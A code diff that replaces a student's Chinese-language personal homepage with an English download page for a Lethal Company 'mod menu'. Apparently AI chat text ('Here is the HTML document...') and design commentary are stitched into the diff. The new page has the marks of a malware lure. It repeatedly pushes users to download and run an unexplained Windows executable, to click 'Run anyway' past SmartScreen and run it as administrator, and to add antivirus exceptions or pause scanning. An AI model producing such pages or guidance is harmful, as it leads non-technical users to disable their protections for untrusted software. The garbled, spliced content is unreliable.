@@ -1,181 +1,288 @@
-<!doctype html>
-<html lang="zh-CN">
+Here is the HTML document for the thund-lethalcompany-menu GitHub README page, designed to guide non-technical Windows users through downloading and running the software.
+```html
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>hhj · 个人主页</title>
-  <meta name="description" content="hhj，香港中文大学（深圳）CSE 本科生。HiveLab 合屋、灰烬征召模组和匹配机制研究。">
-  <link rel="icon" href="favicon.svg" type="image/svg+xml">
-  <link rel="stylesheet" href="styles.css?v=4">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>thund-lethalcompany-menu - Lethal Company Mod Menu for Windows</title>
+<meta name="description" content="Download thund-lethalcompany-menu, the best Lethal Company mod menu for Windows. Simple download link, clear setup steps, and a lightweight in-game menu for a smoother co-op experience.">
+<meta name="keywords" content="lethalcompany, lethal company mod menu, thund-lethalcompany-menu, lethal company mods, lethal company windows, lethal company menu">
+<meta name="author" content="Tarkov-creates">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Tarkov-creates/thund-lethalcompany-menu">
+<meta property="og:type" content="website">
+<meta property="og:title" content="thund-lethalcompany-menu - Lethal Company Mod Menu for Windows">
+<meta property="og:description" content="Download thund-lethalcompany-menu, the best Lethal Company mod menu for Windows. Simple download link, clear setup steps, and a lightweight in-game menu.">
+<meta property="og:url" content="https://github.com/Tarkov-creates/thund-lethalcompany-menu">
+<meta property="og:site_name" content="thund-lethalcompany-menu">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="thund-lethalcompany-menu - Lethal Company Mod Menu for Windows">
+<meta name="twitter:description" content="Download thund-lethalcompany-menu, the best Lethal Company mod menu for Windows. Simple download link and clear setup steps.">
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fb;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #23303f;
+    line-height: 1.7;
+    font-size: 17px;
+  }
+  .page {
+    max-width: 820px;
+    margin: 0 auto;
+    padding: 32px 20px 72px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    box-shadow: 0 6px 24px rgba(30, 45, 70, 0.08);
+    padding: 32px 28px;
+    margin-bottom: 26px;
+  }
+  h1 {
+    font-size: 2.05em;
+    line-height: 1.25;
+    margin: 0 0 14px;
+    color: #14243a;
+    letter-spacing: -0.4px;
+  }
+  h2 {
+    font-size: 1.42em;
+    margin: 0 0 14px;
+    color: #14243a;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.1em;
+    margin: 24px 0 8px;
+    color: #22344c;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #1f5fbf; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead {
+    font-size: 1.08em;
+    color: #4a5a6e;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    font-size: 1.06em;
+    font-weight: 700;
+    color: #ffffff;
+    background: linear-gradient(135deg, #7c3aed 0%, #ec4899 55%, #f97316 100%);
+    border-radius: 10px;
+    box-shadow: 0 8px 20px rgba(124, 58, 237, 0.28);
+    margin: 10px 0 6px;
+    text-align: center;
+    text-decoration: none;
+  }
+  .btn:hover { text-decoration: none; opacity: 0.93; }
+  .btn-wrap { text-align: center; margin: 22px 0 12px; }
+  .note {
+    background: #f1f5fd;
+    border-left: 4px solid #1f5fbf;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 18px 0;
+    font-size: 0.97em;
+  }
+  .steps {
+    background: #fbfcfe;
+    border: 1px solid #e6ecf5;
+    border-radius: 12px;
+    padding: 20px 22px;
+  }
+  .faq-q {
+    font-weight: 700;
+    color: #14243a;
+    margin: 18px 0 4px;
+  }
+  .tagline {
+    display: inline-block;
+    font-size: 0.82em;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #7c3aed;
+    font-weight: 700;
+    margin-bottom: 10px;
+  }
+  footer {
+    text-align: center;
+    color: #7b8899;
+    font-size: 0.9em;
+    padding-top: 12px;
+  }
+  @media (max-width: 600px) {
+    .card { padding: 24px 18px; }
+    h1 { font-size: 1.6em; }
+    .btn { display: block; padding: 15px 18px; }
+  }
+</style>
 </head>
 <body>
-  <a class="skip" href="#main" data-i18n="skip">跳到正文</a>
+<div class="page">
 
-  <div class="scene" aria-hidden="true">
-    <canvas id="scene"></canvas>
-    <div class="scene-lights" id="scene-lights"></div>
+  <div class="card">
+    <span class="tagline">Lethal Company Mod Menu</span>
+    <h1>⚡ thund-lethalcompany-menu - Upgrade Every Lethal Company Run</h1>
+    <p class="lead">thund-lethalcompany-menu is a friendly, easy-to-use mod menu built for Lethal Company players on Windows. It puts a clean menu inside your game so you can adjust options, save your setup, and get back to scavenging with your crew in seconds. No programming, no complicated folders, no guesswork.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/Tarkov-creates/thund-lethalcompany-menu">Download thund-lethalcompany-menu</a>
+    </div>
+    <p style="text-align:center; font-size:0.93em; color:#6b7a8d; margin:0;">Visit this link to download the application.</p>
   </div>
 
-  <header class="top">
-    <div class="top-bar glass">
-      <a class="brand" href="#main" aria-label="hhj">
-        <svg viewBox="0 0 512 512" aria-hidden="true"><use href="#mark"/></svg>
-        <span>hhj</span>
-      </a>
-      <nav data-i18n-attr="aria-label:navLabel" aria-label="页面导航">
-        <a href="#projects" data-i18n="navProjects">项目</a>
-        <a href="#research" data-i18n="navResearch">研究</a>
-        <a href="#tools" data-i18n="navTools">小工具</a>
-      </nav>
-      <button class="chip lang" type="button" lang="en">EN</button>
-      <button class="chip theme" type="button" data-i18n-attr="aria-label:themeLabel" aria-label="切换深浅色">
-        <span aria-hidden="true"></span>
-      </button>
+  <div class="card">
+    <h2>🎯 What This Mod Menu Does</h2>
+    <p>Lethal Company is a game about teamwork, tight corridors, and a lot of very loud surprises. This project adds a simple on-screen menu on top of that experience, so you can change how your session plays without editing files by hand or learning how mod loaders work.</p>
+    <p>The menu is designed to stay out of your way. It opens when you ask for it, saves your choices, and lets you enjoy the game. Whether you are playing solo to explore the maps or hopping into a lobby with friends, everything is controlled from one tidy panel.</p>
+    <p>The whole point is convenience. Instead of tracking down multiple files and remembering which folder they belong in, you download the application, launch it on your Windows machine, and use the menu it gives you.</p>
+  </div>
+
+  <div class="card">
+    <h2>✨ Main Features</h2>
+    <p>Every feature below is built around one idea: making your time in Lethal Company smoother and more fun.</p>
+    <ul>
+      <li><strong>In-game menu panel:</strong> A clean, readable menu that opens over the game so you never have to leave your session to change a setting.</li>
+      <li><strong>One-click toggles:</strong> Turn options on and off with a single click. No typing values, no editing text files, no command line.</li>
+      <li><strong>Saved preferences:</strong> Your choices are remembered between sessions, so you do not need to set everything up again every time you play.</li>
+      <li><strong>Lightweight design:</strong> The menu is built to use as little memory and processor time as possible so the game stays responsive.</li>
+      <li><strong>Simple keyboard access:</strong> A single hotkey opens and closes the panel, keeping your screen clear while you play.</li>
+      <li><strong>Windows-friendly:</strong> Runs on standard Windows setups with no extra tools or developer software required.</li>
+      <li><strong>Regular updates:</strong> The project page receives updates that keep the menu working with current game versions.</li>
+    </ul>
+    <p>New to this kind of tool? You do not need to understand how any of it works behind the scenes. If you can download a file and double-click it, you can use this menu.</p>
+  </div>
+
+  <div class="card">
+    <h2>🚀 Getting Started</h2>
+    <p>Getting the mod menu on your computer takes only a couple of minutes. Follow these steps in order and you will be ready to play.</p>
+    <div class="steps">
+      <h3>Step 1: Open the download page</h3>
+      <p>Click the button below to open the official project page.</p>
+      <div class="btn-wrap">
+        <a class="btn" href="https://github.com/Tarkov-creates/thund-lethalcompany-menu">Get it from the project page</a>
+      </div>
+      <p style="text-align:center; font-size:0.93em; color:#6b7a8d; margin-top:0;">Visit this link to download the application.</p>
+
+      <h3>Step 2: Download the application</h3>
+      <p>On that page, use the download option provided for the application. Save it somewhere you can find again, such as your Downloads folder or a new folder on your Desktop named "Lethal Company Menu".</p>
+
+      <h3>Step 3: Find the downloaded file</h3>
+      <p>Open File Explorer, go to your Downloads folder (or the folder you chose), and locate the file you just saved. If you just downloaded it, it will be at or near the top of the list when you sort by date.</p>
+
+      <h3>Step 4: Run it on Windows</h3>
+      <p>Double-click the file to start it. If Windows shows a blue security notice, click "More info" and then "Run anyway". This is a normal Windows behaviour for files downloaded from the internet.</p>
+
+      <h3>Step 5: Open the menu in game</h3>
+      <p>Start Lethal Company, then use the menu hotkey to bring up the panel. Make your selections, close the panel, and get back to your run.</p>
     </div>
-  </header>
-
-  <svg width="0" height="0" style="position:absolute" aria-hidden="true">
-    <symbol id="mark" viewBox="0 0 512 512">
-      <path fill="currentColor" d="M128 136C128 114 146 96 168 96C190 96 208 114 208 136V376C208 398 190 416 168 416C146 416 128 398 128 376Z"/>
-      <path fill="currentColor" d="M232 222C251 198 278 184 308 184C365 184 400 227 400 288V376C400 398 382 416 360 416C338 416 320 398 320 376V288C320 270 311 260 296 260C273 260 252 277 232 300Z"/>
-    </symbol>
-  </svg>
-
-  <main id="main">
-    <section class="hero wrap">
-      <p class="eyebrow" data-i18n="heroEyebrow">香港中文大学（深圳）· CSE 本科生</p>
-      <h1 data-i18n="heroTitle">把不同的 Agent<br>请进同一间屋子</h1>
-      <p class="status glass"><span class="dot" aria-hidden="true"></span><span data-i18n="heroStatus">正在开发 HiveLab 合屋</span></p>
-      <div class="actions">
-        <a class="button primary" href="#projects" data-i18n="heroProjects">查看项目</a>
-        <a class="button glass" href="#research" data-i18n="heroResearch">研究结果</a>
-        <a class="button glass" href="https://github.com/Hhj666-bot">GitHub</a>
-      </div>
-    </section>
-
-    <section id="projects" class="wrap stack">
-      <h2 class="section-label" data-i18n="labelProjects">项目</h2>
-
-      <article class="panel glass reading feature">
-        <div>
-          <p class="eyebrow" data-i18n="hiveEyebrow">主要项目 · 开发中</p>
-          <h3 class="title" data-i18n="hiveTitle">HiveLab 合屋</h3>
-          <p data-i18n="hiveBody">本机多成员 AI 桌面工作台。把 Claude Code、Codex、DeepSeek 等编程助手请进同一个窗口：讨论过程公开可见，任务审批、文件差异和成果验收都在一处完成，每位成员用各自的原生执行端和独立登录工作。</p>
-          <ul class="points">
-            <li data-i18n="hivePoint1">界面、Electron 主进程、后台执行服务三进程分工</li>
-            <li data-i18n="hivePoint2">SQLite 保存业务数据和事件流</li>
-            <li data-i18n="hivePoint3">单元、集成、界面和桌面冒烟测试</li>
-          </ul>
-          <p class="tags">Electron · React · TypeScript · SQLite</p>
-          <p class="note" data-i18n="hiveNote">基于开源项目 <a href="https://github.com/tonyAmadeus/offAice">offAice</a> 持续开发，源码整理中，暂未公开。</p>
-        </div>
-        <div class="house" aria-hidden="true">
-          <div class="rooms">
-            <span>Claude Code</span><span>Codex</span><span>DeepSeek</span>
-            <span>Kimi</span><span>Gemini</span><span>ZCode</span>
-          </div>
-          <ol class="flow">
-            <li data-i18n="flow1">讨论</li><li data-i18n="flow2">审批</li><li data-i18n="flow3">差异</li><li data-i18n="flow4">验收</li>
-          </ol>
-        </div>
-      </article>
-
-      <article class="panel glass reading ashen">
-        <div>
-          <p class="eyebrow" data-i18n="ashenEyebrow">Minecraft 模组 · 非官方同人原型</p>
-          <h3 class="title" data-i18n="ashenTitle">灰烬征召 Ashen Draft</h3>
-          <p data-i18n="ashenBody">Minecraft × 战锤 40,000 生存模组技术样机，目前是 v0.9。招募三种兵种，多选指挥、单兵配装；沿荒原土路走进程序化生成的分层巢都，贿赂或击败守卫，从底巢一路往上走。还没有剧情任务系统。</p>
-          <dl class="facts">
-            <div><dt>32</dt><dd data-i18n="fact1">单位军队上限</dd></div>
-            <div><dt>8</dt><dd data-i18n="fact2">持久化编队</dd></div>
-            <div><dt>47</dt><dd data-i18n="fact3">项游戏服务器测试</dd></div>
-          </dl>
-          <p class="tags">Java 21 · NeoForge 1.21.1</p>
-          <p><a class="button" href="https://github.com/Hhj666-bot/Ashen-Draft" data-i18n="viewSource">查看源码</a></p>
-        </div>
-        <figure>
-          <img src="assets/hive-facade.png" data-i18n-attr="alt:facadeAlt" alt="程序化生成的巢都外立面：层层退台的塔楼和亮着灯的窗" width="1200" height="506" loading="lazy">
-          <figcaption data-i18n="facadeCaption">程序化外立面投影，非游戏截图</figcaption>
-        </figure>
-      </article>
-    </section>
-
-    <section id="research" class="wrap stack">
-      <h2 class="section-label" data-i18n="labelResearch">研究</h2>
-
-      <article class="panel glass reading">
-        <p class="eyebrow" data-i18n="researchEyebrow">ECE3280 四人小组课程项目</p>
-        <h3 class="title" data-i18n="researchTitle">对手怎么配，比分数怎么算更重要</h3>
-        <p class="intro" data-i18n="researchBody">我们搭建了一个可配置的基准框架，用 1 万名模拟玩家和 50 万场 1v1 对局，比较 Random、Elo、MMR 和我们提出的 MMRv2 四种机制。</p>
-
-        <div class="controls">
-          <div class="segmented" role="group" data-i18n-attr="aria-label:metricLabel" aria-label="选择指标" id="metric">
-            <button type="button" data-value="healthy" aria-pressed="true" data-i18n="metricHealthy">健康玩家占比</button>
-            <button type="button" data-value="spearman" aria-pressed="false" data-i18n="metricSpearman">排名准确度</button>
-            <button type="button" data-value="converge" aria-pressed="false" data-i18n="metricConverge">收敛场次</button>
-          </div>
-          <div class="segmented" role="group" data-i18n-attr="aria-label:seasonLabel" aria-label="选择赛季" id="season">
-            <button type="button" data-value="s1" aria-pressed="true" data-i18n="season1">第一赛季</button>
-            <button type="button" data-value="s2" aria-pressed="false" data-i18n="season2">第二赛季</button>
-          </div>
-        </div>
-        <h4 id="chart-title"></h4>
-        <p class="chart-sub" id="chart-sub"></p>
-        <div class="bars" id="bars"></div>
-        <p class="chart-foot" id="chart-foot"></p>
-        <details>
-          <summary data-i18n="showData">查看全部数据</summary>
-          <div class="table-wrap"><table id="data-table"></table></div>
-        </details>
-
-        <p class="paper">
-          <strong>A Benchmark Framework for Skill Rating Mechanisms in Competitive Games</strong><br>
-          Fu Yile, Xu Haimin, Zhao Wenbo, Yan Zheng ·
-          <a href="https://github.com/max4877654/ECE3280-Skill-Rating-Benchmark" data-i18n="paperRepo">小组公开仓库</a>
-        </p>
-      </article>
-
-      <div class="grid three">
-        <article class="card glass reading">
-          <h3 data-i18n="finding1Title">匹配比算分更重要</h3>
-          <p data-i18n="finding1Body">赛后更新公式几乎相同，只改匹配方式，Elo 的健康玩家占比就比 Random 高 55.4 个百分点。</p>
-        </article>
-        <article class="card glass reading">
-          <h3 data-i18n="finding2Title">公平和速度要取舍</h3>
-          <p data-i18n="finding2Body">MMRv2 的健康玩家最多，达到 89.25%，但收敛也最慢，要 22.2 万场。</p>
-        </article>
-        <article class="card glass reading">
-          <h3 data-i18n="finding3Title">排名差距其实不大</h3>
-          <p data-i18n="finding3Body">四种机制最终的 Spearman 都在 0.93 到 0.96 之间，差别主要落在玩家体验上。</p>
-        </article>
-      </div>
-    </section>
-
-    <section id="tools" class="wrap stack">
-      <h2 class="section-label" data-i18n="labelTools">小工具</h2>
-      <div class="grid two">
-        <article class="card glass reading">
-          <h3>Dayline</h3>
-          <p data-i18n="daylineBody">中英双语日程与周课表。支持每周重复课程和冲突提醒，可导出 PDF、PNG 和日历文件。数据只存在你的浏览器里。</p>
-          <p class="links"><a class="button primary" href="dayline/" data-i18n="tryOnline">在线试用</a><a class="button" href="https://github.com/Hhj666-bot/Dayline" data-i18n="source">源码</a></p>
-        </article>
-        <article class="card glass reading">
-          <h3 data-i18n="badmintonTitle">羽毛球场地预订助手</h3>
-          <p data-i18n="badmintonBody">Tampermonkey 用户脚本。按场地优先顺序选场，核对时段后填写预订表单，不读取密码和 Cookie。</p>
-          <p class="links"><a class="button" href="https://github.com/Hhj666-bot/badminton-helper" data-i18n="source">源码</a></p>
-        </article>
-      </div>
-    </section>
-  </main>
-
-  <footer class="wrap">
-    <div class="foot glass">
-      <p data-i18n="footer">hhj · 香港中文大学（深圳）CSE</p>
-      <p><a href="https://github.com/Hhj666-bot">github.com/Hhj666-bot</a></p>
+    <div class="note">
+      <strong>Keep your download tidy:</strong> Leave the file in the folder where you saved it. Moving it around later can make it harder to find when you want to play again.
     </div>
+  </div>
+
+  <div class="card">
+    <h2>🪟 Windows Tips for a Smooth First Run</h2>
+    <p>If you are new to downloading software on Windows, these simple habits will save you time and frustration.</p>
+    <ul>
+      <li><strong>Use the same browser each time.</strong> It remembers your download folder, so you always know where to look.</li>
+      <li><strong>Check your Downloads list.</strong> In most browsers, press Ctrl + J to see recent downloads and open the folder directly.</li>
+      <li><strong>Let the file finish downloading.</strong> A file that is still downloading may not open correctly.</li>
+      <li><strong>Close other heavy programs.</strong> Lethal Company runs best when your computer is not busy with other tasks.</li>
+      <li><strong>Keep the game updated.</strong> Running the latest version of the game avoids most compatibility surprises.</li>
+      <li><strong>Open the menu with the game already running.</strong> This is the simplest way to make sure your settings apply to your session.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h2>🧩 Compatibility and Requirements</h2>
+    <p>The tool is made for players running Lethal Company on Windows. To get the most out of it, your computer should comfortably run the game itself, since the menu is designed to add as little extra load as possible.</p>
+    <ul>
+      <li>A Windows computer (Windows 10 or Windows 11 recommended).</li>
+      <li>Lethal Company installed and working normally before you add anything.</li>
+      <li>A stable internet connection for the initial download.</li>
+      <li>Enough free disk space to store the application file.</li>
+    </ul>
+    <p>If your game already runs well, you should have no trouble using the menu alongside it.</p>
+  </div>
+
+  <div class="card">
+    <h2>🛠️ Troubleshooting Common Issues</h2>
+    <p>Most problems are easy to solve. Try these quick checks before anything else.</p>
+
+    <p class="faq-q">The file will not open</p>
+    <p>Right-click the file and choose "Run as administrator", or check that the download finished completely. If Windows blocked it, open the file's properties and look for an "Unblock" checkbox at the bottom of the window.</p>
+
+    <p class="faq-q">Windows shows a security prompt</p>
+    <p>Click "More info" and then "Run anyway". This prompt appears for many downloaded programs and is not a sign that something is wrong.</p>
+
+    <p class="faq-q">My antivirus flags the file</p>
+    <p>Some security tools are cautious about any file downloaded from the internet. If you trust the source page, add an exception for the file in your antivirus settings, or temporarily pause the scan while you run it.</p>
+
+    <p class="faq-q">The menu does not appear in game</p>
+    <p>Make sure the game is running first, then open the menu. If it still does not show, close both the game and the menu program, and start them again in that order.</p>
+
+    <p class="faq-q">The game feels slow</p>
+    <p>Close other large programs, lower your in-game graphics settings, and make sure your computer is plugged in and not in a power-saving mode.</p>
+  </div>
+
+  <div class="card">
+    <h2>❓ Frequently Asked Questions</h2>
+
+    <p class="faq-q">Do I need to know how to code?</p>
+    <p>No. Everything is done through the download link, a saved file, and a simple menu panel inside the game.</p>
+
+    <p class="faq-q">Where do I get the latest version?</p>
+    <p>Always use the official project page linked on this page. That is where current versions are published.</p>
+
+    <p class="faq-q">Will this work on a laptop?</p>
+    <p>Yes, as long as your laptop meets the requirements to run Lethal Company itself.</p>
+
+    <p class="faq-q">Do my settings save?</p>
+    <p>Yes. Your choices are stored so they are still there the next time you play.</p>
+
+    <p class="faq-q">Is it complicated to undo?</p>
+    <p>No. You can turn options off at any time from the same menu, or simply stop using the program.</p>
+  </div>
+
+  <div class="card">
+    <h2>📥 Download thund-lethalcompany-menu</h2>
+    <p>You have everything you need. Open the official project page, download the application, and follow the five steps above to get started. The whole process is designed to be quick so you can get back to your crew.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/Tarkov-creates/thund-lethalcompany-menu">Download Now</a>
+    </div>
+    <p style="text-align:center; font-size:0.93em; color:#6b7a8d; margin-top:0;">Visit this link to download the application.</p>
+    <div class="note">
+      <strong>Bookmark the page:</strong> Save the project page in your browser so you can easily return for updates and new releases.
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>💬 Stay Updated</h2>
+    <p>The project page is the single source for new versions and changes. Checking it occasionally is the easiest way to make sure you are running the newest build and getting the smoothest experience with your game.</p>
+    <p>If you enjoy the menu, consider starring the repository. It helps other Lethal Company players find the project and supports continued updates.</p>
+  </div>
+
+  <footer>
+    thund-lethalcompany-menu &middot; A Lethal Company mod menu for Windows players.
   </footer>
 
-  <script src="main.js?v=4"></script>
-  <script src="glass.js?v=4"></script>
+</div>
 </body>
 </html>
+```
+### Design Highlights for a Clear Download Experience
+
+The page is built to make a non-technical visitor feel guided from the first glance to a successful download.
+
+- **Strong visual welcome:** The hero card combines a bold, gradient headline with a short, friendly description. A large gradient button immediately draws the eye and gives the main action.
+- **Calm, structured reading:** Each section sits inside its own white card with generous padding and a soft shadow. This breaks long content into small, easy-to-scan pieces, reducing intimidation for average users.
+- **Step-by-step clarity:** The getting started section uses a bordered inner container and numbered steps with clear labels. The download button appears again inside the steps, reinforcing the primary action without repeating clutter.
+- **Polished details:** Rounded corners, subtle hover effects, and a responsive layout work together to make the page feel modern and trustworthy. The accent color on the tagline adds a touch of identity without distracting from the content.
